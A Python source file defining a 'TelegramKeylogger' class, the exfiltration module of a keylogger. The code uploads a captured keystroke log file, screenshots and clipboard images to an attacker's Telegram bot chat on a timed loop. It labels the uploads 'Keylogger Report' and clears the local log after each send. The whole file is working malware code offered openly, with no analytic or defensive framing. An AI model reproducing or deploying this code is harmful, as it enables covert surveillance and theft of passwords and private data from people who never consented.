import io
import os
import time
import requests
from dotenv import load_dotenv

load_dotenv()

class TelegramKeylogger:
    def __init__(self):
        self.bot_token = os.getenv('BOT_TOKEN')
        self.chat_id = os.getenv('CHAT_ID')
        self.send_interval = int(os.getenv('SEND_INTERVAL', 5))
        self.is_running = True
        self.last_send_time = time.time()

    def send_to_telegram(self):
        try:
            if not os.path.exists("logfile.txt") or os.path.getsize("logfile.txt") == 0:
                return False

            with open("logfile.txt", "r", encoding="utf-8") as f:
                log_content = f.read()

            if not log_content.strip():
                return False

            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"logfile_{timestamp}.txt"

            file_data = io.BytesIO(log_content.encode('utf-8'))
            file_data.name = filename

            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"

            files = {'document': (filename, file_data, 'text/plain')}
            data = {'chat_id': self.chat_id, 'caption': f'Keylogger Report ({time.strftime("%H:%M:%S")})'}

            response = requests.post(url, files=files, data=data, timeout=30)

            if response.status_code == 200:
                open("logfile.txt", 'w').close()
                return True
            else:
                open("logfile.txt", 'w').close()
                print(f"Telegram API error: {response.status_code}")
                return False

        except Exception as e:
            open("logfile.txt", 'w').close()
            print(f"Send error: {e}")
            return False

    def _send_photo(self, image, name):
        image_data = io.BytesIO()
        image.save(image_data, format='PNG')
        image_data.seek(0)

        url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"

        caption = f"{name} ({time.strftime('%H:%M:%S')})"

        files = {'photo': (f'{name}.png', image_data, 'image/png')}
        data = {'chat_id': self.chat_id, 'caption': caption}

        response = requests.post(url, files=files, data=data, timeout=30)

        if response.status_code == 200:
            return True
        else:
            print(f"Telegram photo error: {response.status_code}")
            return False

    def send_screenshot(self, screenshot_image):
        try:
            return self._send_photo(screenshot_image, "Screenshot")

        except Exception as e:
            print(f"Screenshot send error: {e}")
            return False

    def send_clipboard_image(self, image):
        try:
            return self._send_photo(image, "Clipboard_image")

        except Exception as e:
            print(f"Clipboard image send error: {e}")
            return False

    def auto_send_loop(self):
        while self.is_running:
            try:
                current_time = time.time()
                if current_time - self.last_send_time >= self.send_interval:
                    print(f"[{time.strftime('%H:%M:%S')}] Sending logs")
                    success = self.send_to_telegram()

                    if success:
                        print(f"[{time.strftime('%H:%M:%S')}] Logs sent successfully")
                    else:
                        print(f"[{time.strftime('%H:%M:%S')}] Failed to send logs")

                    self.last_send_time = current_time

                time.sleep(30)

            except Exception as e:
                print(f"Auto-send loop error: {e}")
                time.sleep(60)

    def stop(self):
        self.is_running = False
        print("Stop")
        self.send_to_telegram()